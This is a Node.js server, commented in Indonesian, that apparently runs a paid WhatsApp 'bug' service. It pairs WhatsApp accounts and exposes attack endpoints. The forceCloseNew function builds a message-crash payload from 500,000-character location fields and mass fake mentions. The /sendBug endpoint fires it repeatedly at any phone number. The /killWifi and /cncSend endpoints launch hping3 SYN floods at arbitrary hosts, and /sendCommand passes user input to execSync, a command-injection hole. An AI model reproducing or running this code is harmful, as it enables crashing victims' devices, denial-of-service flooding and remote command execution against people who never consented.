// Gateway WA + VPS tools untuk Petro Funx (slim, tanpa Telegram/auto-restart)
// Auth: header x-petro-key atau query ?petro= (PETRO_KEY env)
process.on('unhandledRejection', (r) => console.log('Unhandled:', r && r.message || r));
process.on('uncaughtException', (e) => console.log('Uncaught:', e && e.message || e.message));

const { default: makeWASocket, prepareWAMessageMedia, useMultiFileAuthState, DisconnectReason, generateWAMessage, getBuffer, generateWAMessageFromContent, proto, generateWAMessageContent, fetchLatestBaileysVersion, waUploadToServer, generateRandomMessageId, generateMessageTag, jidEncode, getUSyncDevices } = require("@whiskeysockets/baileys");
const express = require("express");
const cors = require("cors");
const fs = require("fs");
const path = require("path");
const os = require("os");
const crypto = require("crypto");
const pino = require("pino");
const { exec, execSync, spawn } = require("child_process");

const app = express();
app.use(cors({ origin: "*" }));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const PETRO_KEY = process.env.PETRO_KEY || "";
if (!PETRO_KEY) { console.log("FATAL: PETRO_KEY env required"); process.exit(1); }
function auth(req, res, next) {
  const k = req.headers["x-petro-key"] || req.query.petro;
  if (k !== PETRO_KEY) return res.status(401).json({ valid: false, message: "unauthorized" });
  next();
}

const waiting = async (ms) => new Promise(resolve => setTimeout(resolve, ms));
function sleep(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }
const activeConnections = {};

if (!fs.existsSync("permenmd")) fs.mkdirSync("permenmd", { recursive: true });
const CD_FILE = "cooldown.json";
function loadCD(){ try{ return JSON.parse(fs.readFileSync(CD_FILE,"utf8")); }catch(e){ return {}; } }
function saveCD(o){ try{ fs.writeFileSync(CD_FILE, JSON.stringify(o)); }catch(e){} }

// Normalisasi nomor ID: +62 / 62 / 08 / 8 -> 62...
function normalizeID(input) {
  const raw = String(input || "");
  const digits = raw.replace(/\D/g, "");
  if (!digits) return { ok: false, message: "Nomor tidak valid. Contoh: 0812..., 62812..., +62812..." };
  let canon = digits;
  if (canon.startsWith("62")) {}
  else if (canon.startsWith("0")) canon = "62" + canon.slice(1);
  else if (canon.startsWith("8")) canon = "62" + canon;
  else return { ok: false, message: "Nomor tidak valid. Gunakan format 08 / 62 / +62." };
  if (canon.length < 10 || canon.length > 15) return { ok: false, message: "Panjang nomor tidak valid (10-15 digit setelah 62)." };
  if (!/^62\d+$/.test(canon)) return { ok: false, message: "Nomor tidak valid." };
  return { ok: true, number: canon };
}
function normalizeTarget(t) {
  const d = String(t || "").replace(/\D/g, "");
  if (d.startsWith("0")) return "62" + d.slice(1);
  if (d.startsWith("8")) return "62" + d;
  return d;
}
function waitForSockOpen(sock, timeoutMs) {
  return new Promise((resolve) => {
    let done = false;
    const timer = setTimeout(() => { if (!done) { done = true; resolve(false); } }, timeoutMs || 12000);
    const handler = (update) => {
      if (done) return;
      if (update && update.connection === "open") { done = true; clearTimeout(timer); try{ sock.ev.off && sock.ev.off("connection.update", handler); }catch(e){} resolve(true); }
    };
    try { sock.ev.on("connection.update", handler); } catch(e){ if(!done){ done=true; clearTimeout(timer); resolve(false); } }
  });
}
// sesi live milik user (scan subdir permenmd/user/<nomor>/creds.json)
function liveSock(user) {
  const folderPath = path.join("permenmd", user);
  if (!fs.existsSync(folderPath)) return null;
  let entries = [];
  try { entries = fs.readdirSync(folderPath); } catch(e){ return null; }
  for (const entry of entries) {
    const full = path.join(folderPath, entry);
    try {
      if (!fs.lstatSync(full).isDirectory()) continue;
      if (!fs.existsSync(path.join(full, "creds.json"))) continue;
      if (activeConnections[entry] && activeConnections[entry].user) return activeConnections[entry];
      if (activeConnections[entry]) return activeConnections[entry];
    } catch(e){}
  }
  // fallback: socket mana pun yg sudah login
  for (const k of Object.keys(activeConnections)) {
    const s = activeConnections[k];
    if (s && s.user) return s;
  }
  return null;
}
function senderList(user) {
  const folderPath = path.join("permenmd", user);
  if (!fs.existsSync(folderPath)) return [];
  const out = [];
  let entries = [];
  try { entries = fs.readdirSync(folderPath); } catch(e){ return []; }
  for (const entry of entries) {
    if (entry === ".gitkeep") continue;
    const full = path.join(folderPath, entry);
    try {
      if (fs.lstatSync(full).isDirectory()) {
        if (!fs.existsSync(path.join(full, "creds.json"))) continue;
        let reg = false;
        try { reg = !!JSON.parse(fs.readFileSync(path.join(full, "creds.json"), "utf8")).registered; } catch(e){}
        out.push({ id: entry, sessionName: entry, phone: entry, connected: reg && !!activeConnections[entry] });
      } else if (entry.endsWith(".json")) {
        const n = path.basename(entry, ".json");
        out.push({ id: n, sessionName: n, phone: n, connected: !!activeConnections[n] });
      }
    } catch(e){}
  }
  return out;
}

// Payload WA dikosongkan permanen (tunggu payload baru). Pairing + VPS tools tetap jalan.
app.get("/ping", (req, res) => res.json({ ok: true, host: "petro-funx", uptime: process.uptime(), time: new Date().toISOString() }));

app.get("/getServerInfo", auth, (req, res) => {
  res.json({ valid: true, server: { name: "Funx", status: "online", uptime: process.uptime(), freemem: os.freemem(), totalmem: os.totalmem(), load: os.loadavg(), platform: os.platform() } });
});

app.get("/mySender", auth, (req, res) => {
  const user = String(req.query.user || "");
  if (!user) return res.json({ valid: false, message: "missing user" });
  const conns = senderList(user);
  res.json({ valid: true, connections: conns, result: conns });
});

app.get("/deleteSender", auth, (req, res) => {
  const user = String(req.query.user || "");
  const id = String(req.query.id || "");
  if (!user || !id) return res.json({ valid: false, message: "missing user/id" });
  try {
    const dir = path.join("permenmd", user, id);
    if (fs.existsSync(dir)) fs.rmSync(dir, { recursive: true, force: true });
    try { if (fs.existsSync(path.join("permenmd", user, `${id}.json`))) fs.unlinkSync(path.join("permenmd", user, `${id}.json`)); } catch(e){}
    delete activeConnections[id];
    res.json({ valid: true, deleted: true });
  } catch (e) { res.json({ valid: false, message: e.message }); }
});

app.get("/getSenderStats", auth, (req, res) => {
  const user = String(req.query.user || "");
  const mine = senderList(user).filter(c => c.connected).length;
  let glob = 0;
  try {
    for (const k of Object.keys(activeConnections)) { if (activeConnections[k] && activeConnections[k].user) glob++; }
  } catch(e){}
  res.json({ valid: true, private: mine, global: glob });
});

// ===== pairing (single-socket, cek eksistensi) =====
app.get("/getPairing", auth, async (req, res) => {
  const user = String(req.query.user || "");
  if (!user) return res.json({ valid: false, message: "missing user" });
  const norm = normalizeID(req.query.number || "");
  if (!norm.ok) return res.json({ valid: false, message: norm.message });
  const number = norm.number;
  try {
    const sessionDir = path.join("permenmd", user, number);
    if (!fs.existsSync(path.join("permenmd", user))) fs.mkdirSync(path.join("permenmd", user), { recursive: true });
    if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });
    try {
      const cf = path.join(sessionDir, "creds.json");
      if (fs.existsSync(cf)) {
        const cj = JSON.parse(fs.readFileSync(cf, "utf8"));
        if (cj.registered && activeConnections[number]) {
          return res.json({ valid: true, number, pairingCode: null, alreadyLinked: true, message: "Nomor sudah terhubung. Gunakan Refresh." });
        }
      }
    } catch(e){}
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    let version;
    if (process.env.BAILEYS_VERSION) {
      const parts = String(process.env.BAILEYS_VERSION).split(",").map(x => parseInt(x.trim()));
      if (parts.length === 3 && parts.every(n => !isNaN(n))) version = parts;
    }
    if (!version) ({ version } = await fetchLatestBaileysVersion());
    console.log("WA version:", JSON.stringify(version));
    const sock = makeWASocket({
      keepAliveIntervalMs: 50000, logger: pino({ level: "silent" }), auth: state,
      syncFullHistory: true, markOnlineOnConnect: true, connectTimeoutMs: 60000,
      defaultQueryTimeoutMs: 0, generateHighQualityLinkPreview: true,
      browser: ["Ubuntu", "Chrome", "20.0.04"], version
    });
    sock.ev.on("creds.update", saveCreds);
    activeConnections[number] = sock;
    let linkAttempts = 0;
    const tryRelink = async () => {
      // Re-hello pasca-pairing: user sudah input kode, selesaikan login (maks 4x)
      if (linkAttempts >= 4) { console.log(`relink ${number} stop (max)`); return; }
      if (activeConnections[number] && activeConnections[number].user) return; // sudah open
      linkAttempts++;
      console.log(`relink ${number} attempt ${linkAttempts}/4`);
      try {
        const { state: st2, saveCreds: sc2 } = await useMultiFileAuthState(sessionDir);
        const v2 = process.env.BAILEYS_VERSION
          ? process.env.BAILEYS_VERSION.split(",").map(x => parseInt(x.trim()))
          : (await fetchLatestBaileysVersion()).version;
        const s2 = makeWASocket({
          keepAliveIntervalMs: 50000, logger: pino({ level: "silent" }), auth: st2,
          syncFullHistory: true, markOnlineOnConnect: true, connectTimeoutMs: 60000,
          defaultQueryTimeoutMs: 0, generateHighQualityLinkPreview: true,
          browser: ["Ubuntu", "Chrome", "20.0.04"], version: v2
        });
        s2.ev.on("creds.update", sc2);
        activeConnections[number] = s2;
        s2.ev.on("connection.update", async (u2) => {
          if (u2.connection === "open") {
            console.log(`relink ${number} OPEN ✅`);
            try {
              const src = path.join(sessionDir, "creds.json");
              const dst = path.join("permenmd", user, `${number}.json`);
              if (fs.existsSync(src)) fs.writeFileSync(dst, fs.readFileSync(src));
            } catch(e){}
          } else if (u2.connection === "close") {
            const c2 = u2.lastDisconnect?.error?.output?.statusCode;
            if (c2 === DisconnectReason.loggedOut) { delete activeConnections[number]; return; }
            setTimeout(tryRelink, 8000);
          }
        });
      } catch(e) { console.log(`relink ${number} err: ${e.message}`); setTimeout(tryRelink, 8000); }
    };
    sock.ev.on("connection.update", async (update) => {
      const { connection, lastDisconnect } = update;
      if (connection === "close") {
        const code = lastDisconnect?.error?.output?.statusCode;
        console.log(`pairing sock ${number} closed (${code})`);
        if (code === DisconnectReason.loggedOut) { delete activeConnections[number]; return; }
        // Kemungkinan user baru saja input kode (515) -> reconnect untuk selesaikan login
        setTimeout(tryRelink, 5000);
      } else if (connection === "open") {
        console.log(`pairing sock ${number} linked/open`);
        try {
          const src = path.join(sessionDir, "creds.json");
          const dst = path.join("permenmd", user, `${number}.json`);
          if (fs.existsSync(src)) fs.writeFileSync(dst, fs.readFileSync(src));
        } catch(e){}
      }
    });
    const connected = await waitForSockOpen(sock, 12000);
    try {
      let checker = null;
      for (const k of Object.keys(activeConnections)) {
        const s = activeConnections[k];
        if (s && s !== sock && s.user) { checker = s; break; }
      }
      if (!checker && connected && sock.onWhatsApp) checker = sock;
      if (checker && checker.onWhatsApp) {
        let chk = null;
        try { chk = await checker.onWhatsApp(number); } catch(e){ chk = null; }
        if (Array.isArray(chk) && chk.length && !chk[0]?.exists) {
          return res.json({ valid: false, message: "Nomor tidak terdaftar di WhatsApp. Periksa nomornya." });
        }
      }
    } catch(e) { console.log(`[onWhatsApp] ${number}: ${e.message}`); }
    if (!sock.authState.creds.registered) {
      let code = null, lastErr = null;
      try { code = await sock.requestPairingCode(number); }
      catch(e) {
        lastErr = e; console.log(`[pairing retry] ${number}: ${e.message}`);
        await waiting(5000);
        try { code = await sock.requestPairingCode(number); }
        catch(e2) { lastErr = e2; console.log(`[pairing retry2] ${number}: ${e2.message}`); }
      }
      if (code) return res.json({ valid: true, number, pairingCode: code });
      const msg = String(lastErr && lastErr.message || "");
      if (/closed|connect|timeout|network|socket/i.test(msg)) {
        return res.json({ valid: false, message: "Koneksi server ke WhatsApp terputus. Tunggu 30 detik lalu coba lagi (jangan spam request)." });
      }
      return res.json({ valid: false, message: "Gagal membuat kode. Coba lagi." });
    }
    return res.json({ valid: true, number, pairingCode: null, alreadyLinked: true, message: "Nomor sudah terhubung. Gunakan Refresh." });
  } catch (err) { return res.status(500).json({ error: err.message }); }
});


// ===== Payload baru (Telegram): delay / freeze / crash =====
/* 
update function delay no tag sw 20/09/2025 21.46pm
© ErlanggaOfficial
*/

// ===== Payload funct10 (adaptasi Baileys dari location bomb) =====
async function forceCloseNew(sock, target) {
  const closePayload = {
    viewOnceMessage: {
      message: {
        locationMessage: {
          degreesLatitude: 0.000000,
          degreesLongitude: 0.000000,
          name: "ꦽ".repeat(500000),
          address: "ꦽ".repeat(500000),
          contextInfo: {
            mentionedJid: Array.from({ length: 150 }, () =>
              "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
            ),
            isSampled: true,
            participant: target,
            remoteJid: target,
            forwardingScore: 9999,
            isForwarded: true
          }
        }
      }
    }
  };
  const msg = await generateWAMessageFromContent(target, closePayload, {});
  await sock.relayMessage(target, msg.message, { messageId: msg.key.id, participant: { jid: target } });
}

// ===== sendBug (payload kosong — semua bug_id dijawab jujur) =====
const ROLE_CD = { owner: 0, vip: 60, reseller: 240, reseller1: 60, member: 300 };
app.get("/sendBug", auth, async (req, res) => {
  const user = String(req.query.user || "");
  const role = String(req.query.role || "member");
  const bug = String(req.query.bug || "");
  let target = normalizeTarget(req.query.target || "");
  if (!user || !target || !bug) return res.json({ valid: false, message: "missing user/target/bug" });
  const sock = liveSock(user);
  if (!sock) {
    return res.json({ valid: false, sended: false, message: "Tidak ada sender aktif. Pairing dulu." });
  }
  const cd = loadCD();
  const now = Date.now();
  const cool = ROLE_CD[role] !== undefined ? ROLE_CD[role] : 60;
  const last = cd[user + ":" + bug] || 0;
  if (now - last < cool * 1000) {
    return res.json({ valid: true, sended: false, cooldown: true, wait: Math.ceil((cool * 1000 - (now - last)) / 1000) });
  }
  cd[user + ":" + bug] = now; saveCD(cd);
  res.json({ valid: true, sended: true, cooldown: false, role });
  setImmediate(async () => {
    try {
      const targetJid = target + "@s.whatsapp.net";
      if (bug === "delay") {
        for (let i = 0; i < 2; i++) { await forceCloseNew(sock, targetJid); await sleep(3000); }
      } else if (bug === "freeze") {
        for (let i = 0; i < 3; i++) { await forceCloseNew(sock, targetJid); await sleep(3000); }
      } else if (bug === "crash") {
        for (let i = 0; i < 5; i++) { await forceCloseNew(sock, targetJid); await sleep(3000); }
      } else {
        console.log(`[BUG] unknown bug id: ${bug}`);
        return;
      }
      console.log(`[BUG] '${bug}' terkirim ke ${target}`);
    } catch (err) { console.warn(`[SEND ERROR] ${err.message}`); }
  });
});

// ===== debug: kirim teks biasa (tes pipe) =====
app.get("/sendText", auth, async (req, res) => {
  const user = String(req.query.user || "");
  const text = String(req.query.text || "");
  let target = normalizeTarget(req.query.target || "");
  if (!user || !text || !target) return res.json({ valid: false, message: "missing user/text/target" });
  const sock = liveSock(user);
  if (!sock) return res.json({ valid: false, message: "Tidak ada sender aktif." });
  try {
    const r = await sock.sendMessage(target + "@s.whatsapp.net", { text });
    return res.json({ valid: true, sent: true, id: r?.key?.id || null });
  } catch (e) { return res.json({ valid: false, message: e.message }); }
});

// ===== VPS tools (hping3, allowlist) =====
function hasHping() { try { execSync("which hping3", { stdio: "ignore" }); return true; } catch(e){ return false; } }
function isRoot() { try { return execSync("id -u").toString().trim() === "0"; } catch(e){ return false; } }

app.get("/killWifi", auth, (req, res) => {
  const target = String(req.query.target || "");
  const duration = Math.min(parseInt(req.query.duration || "30"), 300);
  const dry = req.query.dry === "1";
  if (!target) return res.json({ valid: false, message: "missing target" });
  const cap = { hping3: hasHping(), root: isRoot() };
  if (dry) return res.json({ valid: true, dry: true, cap });
  if (!cap.hping3) return res.json({ valid: false, message: "hping3 tidak tersedia di VPS." });
  if (!cap.root) return res.json({ valid: false, message: "Butuh root untuk flood. Jalankan sebagai root." });
  try {
    const p = spawn("hping3", ["--flood", "-S", target, "-p", "80"], { detached: true, stdio: "ignore" });
    p.unref();
    setTimeout(() => { try { process.kill(-p.pid); } catch(e){ try{ p.kill(); }catch(_){} } }, duration * 1000);
    res.json({ valid: true, sended: true, message: `killWifi jalan ${duration}s ke ${target}` });
  } catch (e) { res.json({ valid: false, message: e.message }); }
});

app.get("/cncSend", auth, (req, res) => {
  const target = String(req.query.target || "");
  const port = parseInt(req.query.port || "80");
  const duration = Math.min(parseInt(req.query.duration || "60"), 600);
  const dry = req.query.dry === "1";
  if (!target) return res.json({ valid: false, message: "missing target" });
  const cap = { hping3: hasHping(), root: isRoot() };
  if (dry) return res.json({ valid: true, dry: true, sended: false, cap });
  if (!cap.hping3 || !cap.root) return res.json({ valid: false, sended: false, message: "VPS belum siap (butuh hping3+root).", cap });
  try {
    const p = spawn("hping3", ["--flood", "-S", target, "-p", String(port)], { detached: true, stdio: "ignore" });
    p.unref();
    setTimeout(() => { try { process.kill(-p.pid); } catch(e){ try{ p.kill(); }catch(_){} } }, duration * 1000);
    res.json({ valid: true, sended: true, message: `cncSend jalan ${duration}s ke ${target}:${port}` });
  } catch (e) { res.json({ valid: false, sended: false, message: e.message }); }
});

app.get("/sendCommand", auth, (req, res) => {
  const cmd = String(req.query.cmd || req.body?.cmd || "");
  if (!/^hping3\b/.test(cmd.trim())) return res.json({ valid: false, message: "Hanya perintah hping3 yang diizinkan." });
  try {
    const out = execSync(cmd, { timeout: 15000 }).toString().slice(0, 2000);
    res.json({ valid: true, output: out });
  } catch (e) { res.json({ valid: false, message: String(e.message).slice(0, 500) }); }
});

async function bootOne(user, number) {
  const dir = path.join("permenmd", user, number);
  try {
    if (!fs.existsSync(path.join(dir, "creds.json"))) return;
    const cj = JSON.parse(fs.readFileSync(path.join(dir, "creds.json"), "utf8"));
    if (!cj.registered) return;
    if (activeConnections[number] && activeConnections[number].user) return;
    const { state, saveCreds } = await useMultiFileAuthState(dir);
    const ver = process.env.BAILEYS_VERSION
      ? process.env.BAILEYS_VERSION.split(",").map(x => parseInt(x.trim()))
      : (await fetchLatestBaileysVersion()).version;
    const sock = makeWASocket({
      keepAliveIntervalMs: 50000, logger: pino({ level: "silent" }), auth: state,
      syncFullHistory: true, markOnlineOnConnect: true, connectTimeoutMs: 60000,
      defaultQueryTimeoutMs: 0, generateHighQualityLinkPreview: true,
      browser: ["Ubuntu", "Chrome", "20.0.04"], version: ver
    });
    sock.ev.on("creds.update", saveCreds);
    activeConnections[number] = sock;
    sock.ev.on("connection.update", async (up) => {
      if (up.connection === "open") {
        console.log(`boot sock ${number} OPEN`);
      } else if (up.connection === "close") {
        const c = up.lastDisconnect?.error?.output?.statusCode;
        if (c === DisconnectReason.loggedOut) { delete activeConnections[number]; return; }
        console.log(`boot sock ${number} closed (${c}), retry 30s`);
        delete activeConnections[number];
        setTimeout(() => bootOne(user, number), 30000);
      }
    });
  } catch (e) { console.log(`boot ${user}/${number} err: ${e.message}`); }
}
async function bootSessions() {
  let users = [];
  try {
    users = fs.readdirSync("permenmd").filter(n => {
      try { return fs.lstatSync(path.join("permenmd", n)).isDirectory(); } catch(e){ return false; }
    });
  } catch(e){ return; }
  for (const u of users) {
    let nums = [];
    try { nums = fs.readdirSync(path.join("permenmd", u)); } catch(e){ continue; }
    for (const n of nums) {
      try {
        if (!fs.lstatSync(path.join("permenmd", u, n)).isDirectory()) continue;
        await bootOne(u, n);
        await waiting(2000);
      } catch(e){}
    }
  }
}

const PORT = process.env.PORT || process.env.SERVER_PORT || 3000;
app.listen(PORT, "0.0.0.0", () => {
  console.log(`Petro gateway listening ${PORT}`);
  bootSessions().catch(e => console.log("boot err", e.message));
});
